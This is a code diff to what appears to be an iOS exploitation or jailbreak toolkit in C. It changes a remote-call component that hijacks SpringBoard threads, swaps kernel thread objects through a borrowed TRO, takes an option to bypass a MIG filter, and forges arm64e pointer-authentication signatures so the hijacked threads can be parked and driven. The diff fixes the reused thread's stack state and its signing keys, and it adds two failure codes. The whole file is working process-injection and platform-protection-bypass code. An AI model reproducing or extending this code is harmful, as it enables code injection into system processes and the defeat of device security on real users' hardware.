@@ -147,6 +147,8 @@ __thread uint64_t g_RC_bootstrapPid = 0;
 //  11  the create was sent and did not come back from where a return comes from
 //  12  the signature for the start routine could not be produced
 //  13  the callee's symbol did not resolve, so the call was not sent at all
+//  15  the reused thread's park could not be signed
+//  16  the TRO-swap sequence that parks the reused thread failed
 //
 // Without this, "synthetic call thread kobject invalid" is one sentence for nine
 // different failures, four of which are documented in this file as expected on some
@@ -450,6 +452,8 @@ const char *remote_call_last_init_failure_detail(void)
             case 12: step = "start routine signature (remote_pac 0x301) failed"; break;
             case 13: step = "callee symbol did not resolve, call refused"; break;
             case 14: step = "could not park the fresh call thread"; break;
+            case 15: step = "could not sign the reused thread's park"; break;
+            case 16: step = "TRO-swap park of the reused thread failed"; break;
             default: step = "unclassified"; break;
         }
         snprintf(detail, sizeof(detail),
@@ -1381,13 +1385,38 @@ static bool tro_swap_thread_op(uint64_t targetThread,
 
 // Park remote thread at FAKE_PC/LR with no target-task port:
 // suspend → set_state(park) → resume (faults into secondExceptionPort).
+// park_remote_thread_via_tro_swap installs a state into a target thread through a
+// borrowed TRO, suspending, setting and resuming it in one balanced sequence.
+//
+// It takes the whole state rather than a program counter and a link register, and
+// that is the fix. It used to take the two and build the rest here, out of
+// g_RC_originalState, which is the state of the HIJACKED thread, not of the thread
+// being parked. So the reused thread was parked on the hijacked thread's stack
+// pointer and frame pointer, which is the same defect SB IPS 2026-09-26 06:21:04
+// recorded as a thread_set_state returning kr=0 while the resumed thread ran getpid
+// with sp=0.
+//
+// And the caller signed the two program counters with the hijacked thread's PAC keys,
+// because sign_state was handed g_RC_trojanThreadAddr. On arm64e a signature is per
+// thread, so a program counter signed for one thread and resumed on another does not
+// authenticate. That is the class of fault that produces an EXC_BAD_ACCESS on execute
+// or an EXC_BAD_INSTRUCTION at the moment the thread is released, and the reuse path
+// was the one place still doing it: the fresh-thread park was corrected two commits
+// ago to read the target's own state and sign for the target, and this one was missed
+// because it goes through a different helper.
+//
+// So the caller does the reading and the signing, on the thread that is going to be
+// parked, and this function only performs the sequence.
 static bool park_remote_thread_via_tro_swap(uint64_t targetThread,
-                                            uint64_t signedPC,
-                                            uint64_t signedLR,
+                                            const arm_thread_state64_internal *stateToInstall,
                                             bool useMigFilterBypass)
 {
     if (!is_kaddr_valid(targetThread)) {
         RC_DIAG("TRO park: invalid target %#llx", (unsigned long long)targetThread);
+        return false;
+    }
+    if (!stateToInstall) {
+        RC_DIAG("TRO park: no state to install");
         return false;
     }
 
@@ -1399,20 +1428,13 @@ static bool park_remote_thread_via_tro_swap(uint64_t targetThread,
         return false;
     }
 
-    arm_thread_state64_internal park = {0};
-    park.__pc = signedPC;
-    park.__lr = signedLR;
-    park.__sp = g_RC_originalState.__sp;
-    park.__fp = g_RC_originalState.__fp;
-    park.__flags = g_RC_originalState.__flags;
-
     arm_thread_state64_internal *stateBuf =
-        (arm_thread_state64_internal *)malloc(sizeof(park));
+        (arm_thread_state64_internal *)malloc(sizeof(*stateToInstall));
     if (!stateBuf) {
         RC_DIAG("TRO park: malloc stateBuf failed");
         return false;
     }
-    memcpy(stateBuf, &park, sizeof(park));
+    memcpy(stateBuf, stateToInstall, sizeof(*stateToInstall));
 
     // Mark target as in-exception so set_state is accepted (same as wrapper).
     uint16_t options = thread_get_options(targetThread);
@@ -3272,28 +3294,59 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
             // otherwise the thread stays suspended forever.
             do_remote_call_temp(100, "thread_resume", callThreadPort, 0, 0, 0, 0, 0, 0, 0);
         }
+        // The state is the reused thread's own, and the two program counters are
+        // signed for the reused thread. Both were wrong, and both are the same defect
+        // the fresh-thread park had two commits ago, missed here because this path
+        // goes through a different helper and so was not touched when that one was
+        // fixed:
+        //
+        //   the stack and frame pointers came from g_RC_originalState, which belongs
+        //     to the hijacked thread. The reused thread was parked on someone else's
+        //     stack, which is what the 2026-09-26 IPS recorded as a set_state
+        //     returning kr=0 while the thread ran getpid with sp=0.
+        //   the program counters were signed with g_RC_trojanThreadAddr's PAC keys.
+        //     Signatures are per thread on arm64e, so a program counter signed for
+        //     one thread does not authenticate when another one resumes it, and the
+        //     thread faults at the moment it is released — a fault the reuse path
+        //     was in no position to distinguish from anything else.
+        //
+        // A live SpringBoard thread has a real stack pointer, a real frame pointer and
+        // real flags, and reading them is the only way to keep all three.
         arm_thread_state64_internal park = {0};
-        park.__sp = g_RC_originalState.__sp;
-        park.__fp = g_RC_originalState.__fp;
-        park.__flags = g_RC_originalState.__flags;
-        if (!sign_state(g_RC_trojanThreadAddr, &park, FAKE_PC_TROJAN, FAKE_LR_TROJAN)) {
-            // thread_set_state is what actually parks the target thread on this
-            // path, so a failed sign here means the park never happens and the
-            // hijacked thread is still running the target's own code. Stop
-            // rather than set_state it with an unsigned PC.
+        bool haveOwn = false;
+        if (callThreadPort && thread_get_state_wrapper(callThreadPort, &park)) {
+            haveOwn = true;
+        } else {
+            park = (arm_thread_state64_internal){0};
+            park.__sp = g_RC_originalState.__sp;
+            park.__fp = g_RC_originalState.__fp;
+            park.__flags = g_RC_originalState.__flags;
+            RC_DIAG("TRO-swap park: no own state (port=0x%llx), falling back to the "
+                    "hijacked thread's stack", (unsigned long long)callThreadPort);
+        }
+        if (!sign_state(g_RC_callThreadAddr, &park, FAKE_PC_TROJAN, FAKE_LR_TROJAN)) {
+            // thread_set_state is what actually parks the target thread on this path,
+            // so a failed sign here means the park never happens and the thread is
+            // left running the target's own code. Stop rather than set_state it with
+            // an unsigned PC.
             RC_DIAG("TRO-swap park: sign_state failed, not parking thread[1]");
+            g_RC_callThreadStep = 15;
+            g_RC_callThreadPath = haveOwn ? "reuse1-sign-failed-own" : "reuse1-sign-failed";
             g_RC_success = false;
             return -1;
         }
-        RC_DIAG("TRO-swap park thread[1]=0x%llx pc=0x%llx lr=0x%llx",
+        RC_DIAG("TRO-swap park thread[1]=0x%llx pc=0x%llx lr=0x%llx sp=0x%llx own=%d",
                 (unsigned long long)g_RC_callThreadAddr,
                 (unsigned long long)park.__pc,
-                (unsigned long long)park.__lr);
+                (unsigned long long)park.__lr,
+                (unsigned long long)park.__sp,
+                (int)haveOwn);
         RC_DIAG("TRO-swap park begin (no join; fail restores main)");
-        g_RC_callThreadPath = "reuse1";
-        if (!park_remote_thread_via_tro_swap(g_RC_callThreadAddr, park.__pc, park.__lr,
+        g_RC_callThreadPath = haveOwn ? "reuse1" : "reuse1-hijacked-sp";
+        if (!park_remote_thread_via_tro_swap(g_RC_callThreadAddr, &park,
                                              useMigFilterBypass)) {
             RC_DIAG("TRO-swap park failed — restoring main @0x201");
+            g_RC_callThreadStep = 16;
             fail_after_creator_park(RemoteCallInitFailureCallThread, targetPid);
             return -1;
         }
